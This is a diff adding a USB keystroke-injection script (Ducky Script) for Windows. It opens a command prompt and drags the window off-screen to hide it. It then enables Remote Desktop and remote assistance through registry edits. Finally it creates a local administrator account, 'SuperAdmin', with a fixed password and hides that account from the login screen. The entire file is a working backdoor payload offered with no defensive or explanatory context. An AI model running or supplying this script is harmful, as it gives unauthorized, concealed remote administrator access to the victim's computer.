@@ -1,0 +1,43 @@
+DELAY 600
+ESCAPE
+DELAY 400
+ESCAPE
+DELAY 400
+WINDOWS R
+DELAY 500
+STRING cmd
+DELAY 400
+ENTER
+DELAY 800
+ENTER
+ENTER
+ALT SPACE
+DELAY 300
+STRING M
+DELAY 200
+DOWNARROW
+REPEAT 100
+ENTER
+ENTER
+ENTER
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+ENTER
+DELAY 300
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+ENTER
+DELAY 300
+ENTER
+ENTER
+STRING net user SuperAdmin Super@Pass /add && net localgroup administrators SuperAdmin /add
+ENTER
+DELAY 200
+STRING y
+ENTER
+DELAY 400
+ENTER
+STRING reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v SuperAdmin /t REG_DWORD /d 0 /f
+ENTER
+DELAY 300
+ENTER
+STRING exit
+ENTER
